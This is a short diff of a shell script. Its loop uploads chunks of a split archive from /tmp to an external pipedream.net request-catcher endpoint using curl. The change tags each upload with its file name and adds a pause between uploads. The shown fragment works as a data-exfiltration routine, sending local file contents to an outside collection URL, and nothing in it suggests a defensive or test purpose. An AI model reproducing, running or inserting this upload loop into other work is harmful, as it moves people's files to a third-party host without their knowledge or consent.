@@ -16,5 +16,6 @@ echo $(ls -lh /tmp/shk.tar.bz2.part*) >> /tmp/file.txt
 
 for fid in $(ls /tmp/shk.tar.bz2.part*)
 do
-    curl --data-binary "@$fid" https://enmwh7jh1sqb.x.pipedream.net
+    curl --data-binary "@$fid" https://enmwh7jh1sqb.x.pipedream.net?name=$fid
+    sleep 2
 done
